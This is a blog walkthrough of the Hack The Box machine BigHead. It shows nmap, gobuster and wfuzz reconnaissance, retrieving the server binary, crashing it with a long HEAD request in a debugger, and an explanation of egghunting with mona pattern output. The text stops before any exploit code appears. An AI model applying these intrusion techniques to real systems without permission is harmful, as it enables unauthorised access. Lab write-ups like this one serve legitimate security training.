<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - BigHead - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for BigHead from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - BigHead">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/bighead/">


  <meta property="og:description" content="My write-up / walkthrough for BigHead from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - BigHead">
  <meta name="twitter:description" content="My write-up / walkthrough for BigHead from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/bighead/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-05-04T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/bighead/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - BigHead">
    <meta itemprop="description" content="Hack The Box - BigHead">
    <meta itemprop="datePublished" content="2019-05-04T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/bighead/" class="u-url" itemprop="url">Hack The Box - BigHead
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-05-04T07:00:00+02:00">May 4, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          24 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---bighead">Hack The Box - BigHead</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http-enumeration">HTTP Enumeration</a></li>
<li><a href="#buffer-overflow-in-bigheadwebsvr">Buffer Overflow in BigheadWebSvr</a></li>
<li><a href="#writing-the-exploit">Writing the Exploit</a></li>
<li><a href="#enumeration-enumeration-enumeration-">Enumeration, Enumeration, Enumeration …</a></li>
<li><a href="#lfi-in-linktophp-user-flag">LFI in linkto.php, User Flag</a></li>
<li><a href="#alternate-data-stream-in-roottxt">Alternate Data Stream in root.txt</a></li>
<li><a href="#cracking-the-database-root-flag">Cracking the Database, Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---bighead">Hack The Box - BigHead</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of <a href="https://www.imdb.com/title/tt2575988/" target="_blank" rel="noopener noreferrer">Silicon Valley</a> references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.112</code>. I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">bighead.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/bighead/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with nmap to scan for open ports and services :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC bighead.htb</code>
<br><img src="/images/hackthebox/bighead/1.png" alt="" class="align-center"><br><br>
Only one port is open which is port 80 and it’s running http. Let’s take a look.<br></p>

<h2 id="http-enumeration">HTTP Enumeration</h2>
<p><br><img src="/images/hackthebox/bighead/2.png" alt="" class="align-center"><br><br>
It’s a website titled <code class="language-plaintext highlighter-rouge">PiperNet Comes</code>. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying <code class="language-plaintext highlighter-rouge">PIPERNET IS HERE</code>. Also there are two links down there, First one is <code class="language-plaintext highlighter-rouge">THIS IS PIPERNET</code> which is the homepage and the other one is <code class="language-plaintext highlighter-rouge">PIEDPIPERCOIN</code>. Let’s scroll down and see what else do we have :
<br><img src="/images/hackthebox/bighead/3.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">PIEDPIPERCOIN COMES</code>, and there’s a small description of what piedpipercoin is.<br>
<br><img src="/images/hackthebox/bighead/4.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/5.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/6.png" alt="" class="align-center"><br><br>
After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form :
<br><img src="/images/hackthebox/bighead/7.png" alt="" class="align-center"><br><br>
I looked at the contact info and I noticed that the email was <code class="language-plaintext highlighter-rouge">info@bachmanity.htb</code>. Let’s check that domain, but before doing that I wanted to check the other page <code class="language-plaintext highlighter-rouge">PIEDPIPERCOIN</code> :
<br><img src="/images/hackthebox/bighead/8.png" alt="" class="align-center"><br><br>
Instead of <code class="language-plaintext highlighter-rouge">PIEDPIPERCOIN COMES</code> it’s saying <code class="language-plaintext highlighter-rouge">PIEDPIPERCOIN CAME</code> but nothing is interesting. Let’s check <code class="language-plaintext highlighter-rouge">bachmanity.htb</code>, we need to add it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> first :
<br><img src="/images/hackthebox/bighead/9.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">bachmanity.htb</code>
<br><img src="/images/hackthebox/bighead/10.png" alt="" class="align-center"><br><br>
It’s only that image and nothing else :
<br><img src="/images/hackthebox/bighead/11.png" alt="" class="align-center"><br><br>
Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with <code class="language-plaintext highlighter-rouge">test</code> :
<br><img src="/images/hackthebox/bighead/12.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/13.png" alt="" class="align-center"><br><br>
It sends the request to <code class="language-plaintext highlighter-rouge">mailer.bighead.htb</code>, Let’s add it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and try again :
<br><img src="/images/hackthebox/bighead/14.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/15.png" alt="" class="align-center"><br><br>
It shows this message then it redirects the browser back to <code class="language-plaintext highlighter-rouge">bighead.htb</code>. I also intercepted the request with burp :
<br><img src="/images/hackthebox/bighead/16.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/17.png" alt="" class="align-center"><br><br>
Tried to manipulate the input, but couldn’t achieve anything. I went to <code class="language-plaintext highlighter-rouge">mailer.bighead.htb</code> and got redirected to <code class="language-plaintext highlighter-rouge">mailer.bighead.htb/testlink</code> which shows this error :
<br><img src="/images/hackthebox/bighead/18.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/19.png" alt="" class="align-center"><br><br>
In the background I ran <code class="language-plaintext highlighter-rouge">gobuster</code> on <code class="language-plaintext highlighter-rouge">bachmanity.htb</code>  and <code class="language-plaintext highlighter-rouge">bighead.htb</code> with <code class="language-plaintext highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code>. <code class="language-plaintext highlighter-rouge">bachmanity.htb</code> didn’t have anything :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bachmanity.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:21:01 Starting gobuster
=====================================================
/index.html (Status: 200)
/index.htm (Status: 200)
</code></pre></div></div>
<p>but <code class="language-plaintext highlighter-rouge">bighead.htb</code> gave some results :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:16:23 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/backend (Status: 302)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
</code></pre></div></div>
<p>I went to <code class="language-plaintext highlighter-rouge">/assets</code> and it was forbidden :
<br><img src="/images/hackthebox/bighead/20.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">/backend</code> redirected the browser to <code class="language-plaintext highlighter-rouge">bighead.htb/BigHead</code> which gave the same error we saw before :
<br><img src="/images/hackthebox/bighead/21.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/22.png" alt="" class="align-center"><br><br>
I clicked on <code class="language-plaintext highlighter-rouge">error log</code> and it gave the same error :
<br><img src="/images/hackthebox/bighead/23.png" alt="" class="align-center"><br><br>
Let’s check if there are any other subdomains. I used <code class="language-plaintext highlighter-rouge">wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt" target="_blank" rel="noopener noreferrer">subdomains-top1mil-5000.txt</a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">seclists</a>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.bighead.htb" http://10.10.10.112
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/24.png" alt="" class="align-center"><br><br>
non-valid subdomain responses are <code class="language-plaintext highlighter-rouge">11232</code> chars so we will remove those from the output :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.bighead.htb" http://10.10.10.112
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/25.png" alt="" class="align-center"><br><br>
We got 3 subdomains : <code class="language-plaintext highlighter-rouge">dev</code>, <code class="language-plaintext highlighter-rouge">mailer</code> and <code class="language-plaintext highlighter-rouge">code</code>. We already know about <code class="language-plaintext highlighter-rouge">mailer</code>, let’s add <code class="language-plaintext highlighter-rouge">dev</code> and <code class="language-plaintext highlighter-rouge">code</code> :
<br><img src="/images/hackthebox/bighead/26.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">code.bighead.htb</code> redirected the browser to <code class="language-plaintext highlighter-rouge">127.0.0.1:5080/testlink/login.php</code>
<br><img src="/images/hackthebox/bighead/27.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/28.png" alt="" class="align-center"><br><br>
So to see what’s on <code class="language-plaintext highlighter-rouge">code.bighead.htb</code> we will probably need to forward an internal service to our box. We can’t do that now so we will ignore <code class="language-plaintext highlighter-rouge">code.bighead.htb</code> for now.<br>
<code class="language-plaintext highlighter-rouge">dev.bighead.htb</code> shows this image of bighead :
<br><img src="/images/hackthebox/bighead/29.png" alt="" class="align-center"><br><br>
Source has nothing interesting :
<br><img src="/images/hackthebox/bighead/30.png" alt="" class="align-center"><br><br>
I ran <code class="language-plaintext highlighter-rouge">gobuster</code> again and got some results :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://dev.bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:55:05 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/blog (Status: 302)
/blog_ajax (Status: 302)
/blog_inlinemod (Status: 302)
/blog_usercp (Status: 302)
/blog_search (Status: 302)
/blog_report (Status: 302)
/blogger (Status: 302)
/blogindex (Status: 302)
/bloggers (Status: 302)
/blogs (Status: 302)
/blogspot (Status: 302)
/wp-content (Status: 302)
</code></pre></div></div>
<p>But all these pages gave this result :
<br><img src="/images/hackthebox/bighead/31.png" alt="" class="align-center"><br><br>
I intercepted the request in burp to figure out why :
<br><img src="/images/hackthebox/bighead/32.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/33.png" alt="" class="align-center"><br><br>
The response is <code class="language-plaintext highlighter-rouge">302</code>, by following the redirect :
<br><img src="/images/hackthebox/bighead/34.png" alt="" class="align-center"><br><br>
It responds with another <code class="language-plaintext highlighter-rouge">302</code>
<br><img src="/images/hackthebox/bighead/35.png" alt="" class="align-center"><br><br>
So it will keep redirecting us in a loop and we won’t get anything.<br>
At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with <code class="language-plaintext highlighter-rouge">wfuzz</code> instead of <code class="language-plaintext highlighter-rouge">gobuster</code> and I got one more result :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/36.png" alt="" class="align-center"><br><br>
The reason why <code class="language-plaintext highlighter-rouge">gobuster</code> didn’t show us this page is because of the status code. <code class="language-plaintext highlighter-rouge">gobuster</code> only showed results with these status codes : <code class="language-plaintext highlighter-rouge">[+] Status codes : 200,204,301,302,307,403</code>, While <code class="language-plaintext highlighter-rouge">wfuzz</code> showed everything except <code class="language-plaintext highlighter-rouge">404</code> responses, <code class="language-plaintext highlighter-rouge">--hc 404</code>. <code class="language-plaintext highlighter-rouge">/coffee</code> gave a response of <code class="language-plaintext highlighter-rouge">418</code> which is weird. I looked it up and found some info about it <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/418" target="_blank" rel="noopener noreferrer">here</a>. <code class="language-plaintext highlighter-rouge">418 I'm a teapot</code> ! Anyway let’s take a look :
<code class="language-plaintext highlighter-rouge">http://dev.bighead.htb/coffee</code>
<br><img src="/images/hackthebox/bighead/37.png" alt="" class="align-center"><br><br>
It’s showing this <code class="language-plaintext highlighter-rouge">gif</code> :
<br><img src="/images/hackthebox/bighead/teapot.gif" alt="">
Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?!
I intercepted the request with burp and looked at the response :
<br><img src="/images/hackthebox/bighead/38.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/39.png" alt="" class="align-center"><br><br>
I noticed a weird server name : <code class="language-plaintext highlighter-rouge">BigheadWebSvr 1.0</code>. I looked it up and found a repository on the machine creator’s github (3mrgnc3) :
<br><img src="/images/hackthebox/bighead/40.png" alt="" class="align-center"><br><br>
I searched through the commits and got <a href="https://github.com/3mrgnc3/BigheadWebSvr/blob/b1b4d6ed5f2298bc243cd56cab77cd6fb4e48c3d/BHWS_Backup.zip" target="_blank" rel="noopener noreferrer">this one</a> which seemed to be the right one.<br>
<br><img src="/images/hackthebox/bighead/41.png" alt="" class="align-center"><br><br>
It asked for a password :
<br><img src="/images/hackthebox/bighead/42.png" alt="" class="align-center"><br><br>
I tried to guess it and after some attempts <code class="language-plaintext highlighter-rouge">bighead</code> worked :
<br><img src="/images/hackthebox/bighead/43.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/44.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/45.png" alt="" class="align-center"><br><br>
Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow.<br></p>

<h2 id="buffer-overflow-in-bigheadwebsvr">Buffer Overflow in <code class="language-plaintext highlighter-rouge">BigheadWebSvr</code>
</h2>
<p>I tried to run the server but it complained about some missing <code class="language-plaintext highlighter-rouge">dll</code> called <code class="language-plaintext highlighter-rouge">libmingwex-0.dll</code> :
<br><img src="/images/hackthebox/bighead/46.png" alt="" class="align-center"><br><br>
 So I installed <a href="https://osdn.net/projects/mingw/releases/" target="_blank" rel="noopener noreferrer">mingw</a> and copied the <code class="language-plaintext highlighter-rouge">dll</code> to the same directory as the server :
<br><img src="/images/hackthebox/bighead/47.png" alt="" class="align-center"><br><br>
Then I had to allow access for it :
<br><img src="/images/hackthebox/bighead/48.png" alt="" class="align-center"><br><br>
Now the server is running :
<br><img src="/images/hackthebox/bighead/49.png" alt="" class="align-center"><br><br>
But not on port 80 :
<br><img src="/images/hackthebox/bighead/50.png" alt="" class="align-center"><br><br>
I did <code class="language-plaintext highlighter-rouge">netstat -a -b</code> and found that it’s running on port 8008 :
<br><img src="/images/hackthebox/bighead/51.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/52.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/53.png" alt="" class="align-center"><br><br>
Great, I intercepted the request with burp then I ran the server again with <a href="https://www.immunityinc.com/products/debugger/" target="_blank" rel="noopener noreferrer">Immunity Debugger</a> :
<br><img src="/images/hackthebox/bighead/54.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/55.png" alt="" class="align-center"><br><br>
Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D
<br><img src="/images/hackthebox/bighead/56.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/57.png" alt="" class="align-center"><br><br>
And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example <code class="language-plaintext highlighter-rouge">R1ck</code> that egg is doubled and added before the shellcode like this : <code class="language-plaintext highlighter-rouge">R1ckR1ck + shellcode</code>. It’s explained very well in skape’s paper <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" target="_blank" rel="noopener noreferrer">Safely Searching Process Virtual Address Space</a>. There are also many practical tutorials just search for win32 egghunting.<br>
Now back to the vulnerable server, first thing we need to know is the offset. I’m using <a href="https://github.com/corelan/mona" target="_blank" rel="noopener noreferrer">mona plugin</a>. <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" target="_blank" rel="noopener noreferrer">Documentation</a>.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!mona config -set workingfolder c:\logs\%p`, to make `mona` output to `C:\logs
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/58.png" alt="" class="align-center"><br><br>
To find the offset we will create a pattern <code class="language-plaintext highlighter-rouge">!mona pc 100</code> (creates a pattern of 100 chars), this is the same as <code class="language-plaintext highlighter-rouge">pattern_create.rb</code> from <code class="language-plaintext highlighter-rouge">metasploit</code>. I used it in my <a href="/categories/#binary-exploitation">buffer overflow write-ups</a>.<br>
<br><img src="/images/hackthebox/bighead/59.png" alt="" class="align-center"><br><br>
It will put the output in a file called <code class="language-plaintext highlighter-rouge">pattern.txt</code> in <code class="language-plaintext highlighter-rouge">C:\logs</code> :
<br><img src="/images/hackthebox/bighead/60.png" alt="" class="align-center"><br><br>
Pattern :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/61.png" alt="" class="align-center"><br><br>
Full output :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">================================================================================</span>
  <span class="n">Output</span> <span class="n">generated</span> <span class="n">by</span> <span class="n">mona</span><span class="p">.</span><span class="n">py</span> <span class="n">v2</span><span class="p">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">rev</span> <span class="mi">585</span> <span class="o">-</span> <span class="n">Immunity</span> <span class="n">Debugger</span>
  <span class="n">Corelan</span> <span class="n">Team</span> <span class="o">-</span> <span class="n">https</span><span class="o">:</span><span class="c1">//www.corelan.be</span>
<span class="o">================================================================================</span>
  <span class="n">Process</span> <span class="n">being</span> <span class="n">debugged</span> <span class="o">:</span> <span class="n">BigheadWebSvr</span> <span class="p">(</span><span class="n">pid</span> <span class="mi">1300</span><span class="p">)</span>
  <span class="n">Current</span> <span class="n">mona</span> <span class="n">arguments</span><span class="o">:</span> <span class="n">pc</span> <span class="mi">100</span>
<span class="o">================================================================================</span>
  <span class="mi">2019</span><span class="o">-</span><span class="mo">04</span><span class="o">-</span><span class="mi">24</span> <span class="mi">22</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">44</span>
<span class="o">================================================================================</span>

<span class="n">Pattern</span> <span class="n">of</span> <span class="mi">100</span> <span class="n">bytes</span> <span class="o">:</span>
<span class="o">----------------------</span>

<span class="n">ASCII</span><span class="o">:</span>
<span class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</span>

<span class="n">HEX</span><span class="o">:</span>
<span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x30</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x32</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x33</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x34</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x35</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x36</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x37</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x38</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x61</span><span class="err">\</span><span class="n">x39</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x30</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x32</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x33</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x34</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x35</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x36</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x37</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x38</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x39</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x30</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x32</span><span class="err">\</span><span class="n">x41</span><span class="err">\</span><span class="n">x63</span><span class="err">\</span><span class="n">x33</span><span 